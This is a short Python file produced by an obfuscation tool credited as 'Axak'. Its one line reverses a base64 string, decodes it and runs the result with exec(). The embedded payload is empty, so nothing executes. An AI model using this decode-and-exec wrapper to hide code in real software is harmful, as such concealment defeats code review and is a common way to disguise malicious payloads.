# Obfuscated By Axak 
# https://www.github.com/PaNdAxAk 
# Time : Mon Jun  6 15:07:32 2022 

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))